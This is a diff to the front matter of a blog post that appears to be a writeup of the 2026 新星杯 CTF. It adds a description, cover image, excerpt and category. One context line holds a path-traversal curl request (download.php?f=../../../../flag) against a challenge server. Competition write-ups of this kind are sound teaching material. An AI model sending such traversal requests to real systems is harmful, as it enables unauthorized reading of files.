@@ -2,7 +2,12 @@
 title: "2026新星杯 Writeup"
 ctf: "新星杯"
 date: 2026-05-31
+description: 记录 2026 新星杯 Crypto、Misc、Pwn、Reverse、Web 方向的解题过程和关键脚本。
+cover: /assets/img/brand/black-hole.png
+excerpt: 按题型整理新星杯 Writeup，把题目观察、利用思路、脚本和最终 flag 格式集中归档。
+sticky: 25
 categories:
+  - CTF
   - crypto
   - misc
   - pwn
@@ -1812,4 +1817,3 @@ f 参数拼到 uploads 路径后只做了 realpath()，没有校验结果仍在 
 ```
 curl "http://116.211.228.232:43845/download.php?f=../../../../flag"
 ```
-
